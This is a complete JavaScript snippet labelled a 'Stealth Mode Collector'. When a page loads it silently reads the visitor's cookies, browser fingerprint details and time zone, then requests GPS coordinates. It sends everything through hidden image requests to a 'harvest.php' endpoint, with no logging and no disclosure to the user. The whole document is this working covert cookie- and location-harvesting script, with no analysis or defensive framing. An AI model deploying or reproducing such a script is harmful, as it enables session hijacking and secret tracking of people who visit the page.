// Stealth Mode Collector - No console logs
(function() {
    const server = window.location.origin;
    
    function silentSend(type, data) {
        const img = new Image();
        img.src = `${server}/php/harvest.php?type=${type}&data=${encodeURIComponent(JSON.stringify(data))}&_=${Date.now()}`;
    }
    
    const data = {
        c: document.cookie,
        u: navigator.userAgent,
        s: screen.width + 'x' + screen.height,
        t: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
    
    silentSend('stealth', data);
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(p => {
            silentSend('gps', {lat: p.coords.latitude, lon: p.coords.longitude});
        });
    }
})();
